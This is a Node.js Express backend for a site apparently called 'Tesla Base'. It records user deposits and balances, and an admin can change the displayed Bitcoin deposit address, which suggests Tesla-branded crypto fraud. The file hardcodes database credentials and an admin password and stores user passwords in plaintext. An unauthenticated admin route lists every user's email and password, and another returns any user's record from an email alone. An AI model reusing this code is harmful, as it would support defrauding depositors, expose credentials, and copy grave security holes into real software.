const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');
const app = express();

app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname)));

// --- DATABASE CONFIG ---
const dbUser = "postgres.ggrvkcxnizchfbzfwvjv";
const dbPass = encodeURIComponent("SOLOMON2003$#56777");
const dbHost = "aws-1-us-east-1.pooler.supabase.com";
const connectionString = `postgresql://${dbUser}:${dbPass}@${dbHost}:5432/postgres`;

const pool = new Pool({
    connectionString: connectionString,
    ssl: { rejectUnauthorized: false }
});

// AUTO-FIX: Creates Users and Settings tables
const initDb = async () => {
    try {
        // Create Users Table
        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                email VARCHAR(255) UNIQUE NOT NULL,
                password TEXT NOT NULL,
                balance DECIMAL(20, 2) DEFAULT 0.00,
                wallet_address TEXT DEFAULT '1Tesla' || md5(random()::text),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `);
        // Create Settings Table for the Global BTC Deposit Address
        await pool.query(`
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT
            );
        `);
        // Set a default BTC address if none exists
        await pool.query(`
            INSERT INTO settings (key, value) 
            VALUES ('btc_deposit_address', '1DefaultBitcoinAddress') 
            ON CONFLICT (key) DO NOTHING;
        `);
        console.log("✅ Database & Admin Settings Ready");
    } catch (err) {
        console.error("❌ Database Error:", err.message);
    }
};
initDb();

// --- HOMEPAGE ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const ADMIN_PASS = "SOLOMON200";

// --- ADMIN WALLET UPDATE FEATURE ---
// Update the Bitcoin address displayed on the web
app.post('/api/admin/update-wallet', async (req, res) => {
    const { password, newAddress } = req.body;
    if (password !== ADMIN_PASS) return res.status(401).json({ error: "Unauthorized" });
    
    try {
        await pool.query("UPDATE settings SET value = $1 WHERE key = 'btc_deposit_address'", [newAddress]);
        res.json({ success: true, message: "Bitcoin deposit address updated!" });
    } catch (err) { res.status(500).json({ error: "Update failed" }); }
});

// Get the current Bitcoin address for the website
app.get('/api/site/wallet', async (req, res) => {
    try {
        const result = await pool.query("SELECT value FROM settings WHERE key = 'btc_deposit_address'");
        res.json({ address: result.rows[0].value });
    } catch (err) { res.status(500).json({ error: "Fetch failed" }); }
});

// --- OTHER ADMIN FEATURES ---
app.post('/api/admin/verify', (req, res) => {
    if (req.body.password === ADMIN_PASS) res.json({ success: true });
    else res.status(401).json({ error: "Unauthorized" });
});

app.get('/api/admin/users', async (req, res) => {
    try {
        const result = await pool.query('SELECT email, password, balance FROM users ORDER BY id DESC');
        res.json(result.rows);
    } catch (err) { res.status(500).json({ error: "Access Denied" }); }
});

// --- USER AUTH & DATA ---
app.post('/api/auth/register', async (req, res) => {
    const { email, password } = req.body;
    try {
        await pool.query('INSERT INTO users (email, password) VALUES ($1, $2)', [email, password]);
        res.json({ success: true });
    } catch (err) { res.status(500).json({ error: "Email already exists" }); }
});

app.post('/api/auth/login', async (req, res) => {
    const { email, password } = req.body;
    try {
        const result = await pool.query('SELECT * FROM users WHERE email = $1 AND password = $2', [email, password]);
        if (result.rows.length > 0) res.json({ success: true, email: email });
        else res.status(401).json({ error: "Invalid credentials" });
    } catch (err) { res.status(500).json({ error: "Login failed" }); }
});

app.get('/api/user/data', async (req, res) => {
    const { email } = req.query;
    try {
        const result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
        res.json(result.rows[0]);
    } catch (e) { res.status(500).json({ error: "DB Error" }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Tesla Base Live on ${PORT}`));
        
